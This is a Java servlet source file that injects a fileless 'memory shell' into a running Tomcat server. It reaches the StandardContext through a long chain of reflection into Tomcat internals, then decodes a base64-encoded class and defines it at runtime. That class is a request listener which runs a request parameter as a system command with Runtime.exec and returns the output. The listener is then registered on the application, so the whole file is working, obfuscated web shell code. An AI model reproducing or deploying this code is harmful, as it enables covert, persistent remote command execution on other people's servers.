package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;

public class InjectListenerByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Object StandardContext= null;
        try{
            StandardContext = getContext();
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ListenerBase64="yv66vgAAADQAsQoAJABkCgBlAGYHAGcKACMAaAgAaQsAAwBqCgAjAGsLACEAbAoAbQBuBwBvCgBwAHEKAHAAcgoAcwB0BwB1CgAOAHYHAHcKABAAeAcAeQoAEgBkCgAQAHoHAHsKABUAZAoAFQB8CAB9CgAVAH4KABIAfwoAEgB+CgAkAIAIAIEKAIIAgwoAhACFCgCEAIYHAIcIAIgHAIkHAIoHAIsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADExNeUxpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAiQcAjAcAZwcAhwcAjQcAbwEAC0NvbW1hbmRFeGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJydAEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARwcm9jAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnN0ZGVycgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAA2lzcgEAG0xqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAAnNiAQAYTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7BwCOBwCPBwCQBwB1BwB3BwB5AQAKRXhjZXB0aW9ucwEAFmdldFJlc3BvbnNlRnJvbVJlcXVlc3QBAFEoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAR2YXIzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjQBAAR2YXI1AQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNgEABHZhcjgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBAA9NeUxpc3RlbmVyLmphdmEMACYAJwcAjAwAkQCSAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAVgBXAQAIbGlzdGVuZXIMAJMAQQwAQABBDACUAJUHAJYMAJcAmAEAE2phdmEvbGFuZy9FeGNlcHRpb24HAI4MAJkAmgwAmwCcBwCPDACdAJ4BABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAmAJ8BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAmAKABABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDAChAKIBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAowCkAQABCgwApQCiDACjAKYMAKcAqAEACHJlc3BvbnNlBwCpDACqAKsHAKwMAK0ArgwArwCwAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAdyZXF1ZXN0AQAKTXlMaXN0ZW5lcgEAEGphdmEvbGFuZy9PYmplY3QBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2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";
            byte[] ListenerClass = new BASE64Decoder().decodeBuffer(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);
            Object listenerObject=(Object)listenerClass.newInstance();
            Method m1=StandardContext.getClass().getDeclaredMethod("getApplicationEventListeners");
            m1.setAccessible(true);
            Object[] al=(Object[]) m1.invoke(StandardContext);
            Object[] tempArr = new Object[al.length+1];
            System.arraycopy(al, 0, tempArr, 0, al.length);
            tempArr[al.length]=listenerObject;
            Method m2=StandardContext.getClass().getDeclaredMethod("setApplicationEventListeners", Object[].class);
            m2.setAccessible(true);
            m2.invoke(StandardContext,new Object[]{tempArr});
        } catch (Exception e){e.printStackTrace();}
    }


    public Object getContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for (Thread thread : threads) {
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                Field tfield = thread.getClass().getDeclaredField("target");
                tfield.setAccessible(true);
                Object NioEndpoint$ = tfield.get(thread);

                Field thisField = NioEndpoint$.getClass().getDeclaredField("this$0");
                thisField.setAccessible(true);
                Object NioEndpointO = thisField.get(NioEndpoint$);

                Field handlerField = NioEndpointO.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                ;
                handlerField.setAccessible(true);
                Object AbstractProtocol = handlerField.get(NioEndpointO);

                Field globalField = AbstractProtocol.getClass().getDeclaredField("proto");
                globalField.setAccessible(true);
                Object Http11NioProtocol = globalField.get(AbstractProtocol);

                Field adapterField = Http11NioProtocol.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adapter");
                adapterField.setAccessible(true);
                Object CoyoteAdapter = adapterField.get(Http11NioProtocol);

                Field connectorField = CoyoteAdapter.getClass().getDeclaredField("connector");
                connectorField.setAccessible(true);
                Object Connector = connectorField.get(CoyoteAdapter);

                Field serviceField = Connector.getClass().getDeclaredField("service");
                serviceField.setAccessible(true);
                Object StandardService = serviceField.get(Connector);

                Field engineField = StandardService.getClass().getDeclaredField("engine");
                engineField.setAccessible(true);
                Object StandardEngine = engineField.get(StandardService);

                Field childrenField = StandardEngine.getClass().getSuperclass().getDeclaredField("children");
                childrenField.setAccessible(true);
                HashMap HashMap = (java.util.HashMap) childrenField.get(StandardEngine);

                Object StandardHost = HashMap.values().iterator().next();
                Field childrenFieldH = StandardHost.getClass().getSuperclass().getDeclaredField("children");
                childrenFieldH.setAccessible(true);
                HashMap hashMap = (HashMap) childrenFieldH.get(StandardHost);

                Object standardContext = hashMap.values().iterator().next();
                return standardContext;
            }
        }
        return null;
    }
}
